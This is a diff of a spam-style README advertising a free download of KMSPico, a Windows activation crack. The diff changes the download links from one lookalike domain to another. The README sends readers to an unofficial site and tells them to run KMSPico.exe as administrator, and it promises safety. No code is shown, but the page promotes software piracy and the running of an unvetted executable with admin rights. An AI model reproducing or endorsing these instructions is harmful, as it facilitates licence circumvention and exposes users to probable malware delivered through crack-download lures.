@@ -1,12 +1,12 @@
 # Free KMSPico Download | No Internet Required After Setup
 
-[![Downloads](https://img.shields.io/badge/downloads-10M%2B-green.svg)](https://kmpsico-download.us/)
-[![Version](https://img.shields.io/badge/version-latest-blue.svg)](https://kmpsico-download.us/)
-[![License](https://img.shields.io/badge/license-free-red.svg)](https://kmpsico-download.us/)
+[![Downloads](https://img.shields.io/badge/downloads-10M%2B-green.svg)](https://kmspico-download.us/)
+[![Version](https://img.shields.io/badge/version-latest-blue.svg)](https://kmspico-download.us/)
+[![License](https://img.shields.io/badge/license-free-red.svg)](https://kmspico-download.us/)
 
 ## Download KMSPico Today
 
-<a href="https://kmpsico-download.us/" target="_blank">
+<a href="https://kmspico-download.us/" target="_blank">
   <img src="https://img.shields.io/badge/Download_KMSPico-Official_Site-blue?style=for-the-badge&logo=windows" alt="Download KMSPico"/>
 </a>
 
@@ -26,7 +26,7 @@ KMSPico has become the go-to activation tool for millions of users worldwide. It
 
 ## Installation Instructions
 
-Download the latest version from [kmpsico-download.us](https://kmpsico-download.us/), extract the files, and run KMSPico.exe as administrator. Click activate for your desired product and wait for confirmation. That's all there is to it!
+Download the latest version from [kmpsico-download.us](https://kmspico-download.us/), extract the files, and run KMSPico.exe as administrator. Click activate for your desired product and wait for confirmation. That's all there is to it!
 
 ## Is It Safe?
 
